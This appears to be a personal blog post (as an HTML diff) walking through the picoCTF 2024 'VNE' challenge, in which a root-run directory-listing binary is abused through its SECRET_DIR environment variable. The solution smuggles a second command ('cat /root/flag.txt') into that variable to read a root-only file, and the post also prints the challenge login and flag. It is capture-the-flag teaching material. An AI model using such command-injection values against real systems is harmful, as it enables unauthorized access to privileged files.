@@ -1,0 +1,173 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>picoCTF: VNE · river</title>
+    <meta name="description" content="Abusing environment variables">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/picoctf-vne/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="picoCTF: VNE">
+    <meta property="og:description" content="Abusing environment variables">
+    <meta property="og:url" content="https://rivers.sh/posts/picoctf-vne/">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">picoCTF: VNE</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2024-08-21">Aug 21, 2024</time><span>1 min read</span><span class="post-cats"><a href="/categories/ctf/">CTF</a> › <a href="/categories/ctf/picoctf2024/">picoCTF2024</a> › <a href="/categories/ctf/picoctf2024/medium/">Medium</a></span><span class="post-tags"><a class="p-category" href="/tags/binary-exploitation/">#Binary Exploitation</a> <a class="p-category" href="/tags/environment/">#Environment</a> <a class="p-category" href="/tags/injection/">#Injection</a></span></div>
+        <p class="post-description p-summary">Abusing environment variables</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#attempts">Attempts</a></li><li class="toc-h2"><a href="#understanding-the-challenge">Understanding the Challenge</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h1 id="challenge-info">Challenge Info</h1>
+<p>description:<br />
+<code>This’ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:59803, and run the binary named “bin” once connected. Login as ctf-player with the password, af86add3</code></p>
+<p>author: Junias Bonou</p>
+<p><img src="/images/VNE/vne.png" alt="vne" /></p>
+<h2 id="attempts"><a href="#attempts" class="anchor">#</a>Attempts</h2>
+<p>Upon connecting, I ran <code>pwd</code> and <code>ls</code> to see what we have:</p>
+<pre><code>ctf-player@pico-chall$ pwd
+/home/ctf-player
+ctf-player@pico-chall$ ls
+bin</code></pre>
+<p>I tried navigating around with <code>cd</code>, until I finally found something interesting:</p>
+<pre><code>ctf-player@pico-chall$ cd ..
+ctf-player@pico-chall$ ls
+bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
+boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
+ctf-player@pico-chall$ cd challenge
+-bash: cd: challenge: Permission denied</code></pre>
+<p>A challenge folder, which the flag is probably inside of. Unfortunately, we can't navigate into it. Next, I tried seeing if sudo was available, to no success.</p>
+<pre><code>ctf-player@pico-chall$ sudo
+-bash: sudo: command not found
+ctf-player@pico-chall$</code></pre>
+<p>Finally, I want back to ctf-player to try and execute the binary we're given. Unfortunately, upon trying to execute it, I'm met with a problem:</p>
+<pre><code>ctf-player@pico-chall$ ls
+bin
+ctf-player@pico-chall$ ./bin
+Error: SECRET_DIR environment variable is not set
+ctf-player@pico-chall$</code></pre>
+<p>Okay, so lets try setting the <code>SECRET_DIR</code> environment variable:</p>
+<pre><code>ctf-player@pico-chall$ export SECRET_DIR=/
+ctf-player@pico-chall$ ./bin
+Listing the content of / as root:
+bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
+boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
+ctf-player@pico-chall$</code></pre>
+<h2 id="understanding-the-challenge"><a href="#understanding-the-challenge" class="anchor">#</a>Understanding the Challenge</h2>
+<p>The binary called "bin" that we've been executing, reads directories with root permissions, so when we set <code>SECRET_DIR=/</code>, it read everything in / as root. Using this information, we can use the environment variable to poke around different directories, starting with <code>/challenge</code>:</p>
+<pre><code>ctf-player@pico-chall$ export SECRET_DIR=/challenge
+ctf-player@pico-chall$ ./bin
+Listing the content of /challenge as root:
+config-box.py  metadata.json  profile
+ctf-player@pico-chall$ export SECRET_DIR=/root
+ctf-player@pico-call$ ./bin
+Listing the contents of /root as root:
+flag.txt
+ctf-player@pico-chall$</code></pre>
+<p>So, while <code>/challenge</code> didn't yield any success, <code>/root</code> shows us where the flag is, and that it's in a <code>.txt</code>. Which is great and all, but how can we actually read the contents of it? As seen previously, <code>bin</code> only reads directories, so it doesn't serve any use... unless we can chain commands...</p>
+<h2 id="solution"><a href="#solution" class="anchor">#</a>Solution</h2>
+<pre><code>ctf-player@pico-chall$ export SECRET_DIR=&quot;ls /root | cat /root/flag.txt&quot;
+ctf-player@pico-chall$ ./bin
+Listing the content of ls /root | cat /root/flag.txt as root:
+picoCTF{Power_t0_man!pul4t3_3nv_1670f174}ls: cannot access &#39;ls&#39;: No such file or directory
+ctf-player@pico-chall$</code></pre>
+<p>flag: <code>picoCTF{Power_t0_man!pul4t3_3nv_1670f174}</code></p>
+
+    </div>
+
+    <nav class="post-nav" aria-label="more posts">
+        <a class="prev" href="/posts/n00bzctf-sillygoose/" rel="prev"><span class="post-nav-label">‹ older</span>N00bzCTF: Sillygoose</a>
+        <a class="next" href="/posts/picoctf-formatstring1/" rel="next"><span class="post-nav-label">newer ›</span>picoCTF: Format String 1</a>
+    </nav>
+</article>
+
+<aside class="post-aside" aria-label="on this page">
+    <ul class="aside-actions">
+        <li><a href="/posts/n00bzctf-sillygoose/" title="older: N00bzCTF: Sillygoose" aria-label="older post">‹</a></li>
+        <li><a href="/posts/picoctf-formatstring1/" title="newer: picoCTF: Format String 1" aria-label="newer post">›</a></li>
+        <li><a href="#top" class="to-top" title="back to top" aria-label="back to top">↑</a></li>
+    </ul>
+    <nav class="toc toc-side" aria-label="contents"><ol><li class="toc-h2"><a href="#attempts">Attempts</a></li><li class="toc-h2"><a href="#understanding-the-challenge">Understanding the Challenge</a></li><li class="toc-h2"><a href="#solution">Solution</a></li></ol></nav>
+</aside>
+
+        </main>
+        <footer class="site-footer">
+    <span class="footer-left">
+        <span>&copy; 2024–2026 river</span>
+        <button type="button" class="contact-button" aria-controls="toast" data-label="email" data-value="bG92ZS5yaXZlcnNAcHJvdG9uLm1l">email</button><button type="button" class="contact-button" aria-controls="toast" data-label="signal" data-value="cml2LjEzMzc=">signal</button>
+    </span>
+    <span class="footer-links">
+        <a href="/atom.xml">atom</a>
+        <button type="button" class="scheme-toggle" title="switch colour scheme">scheme: <span class="scheme-name">river</span></button>
+    </span>
+    <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
+</footer>
+
+    </div>
+    <script src="/js/main.js" defer></script>
+    
+    
+    <script>
+    // oneko chases the cursor, so skip it on touch screens
+    (function () {
+      if (!matchMedia("(hover: hover) and (pointer: fine)").matches) return;
+      var s = document.createElement("script");
+      s.src = "/js/oneko.js";
+      document.body.appendChild(s);
+    })();
+    </script>
+    
+</body>
+</html>
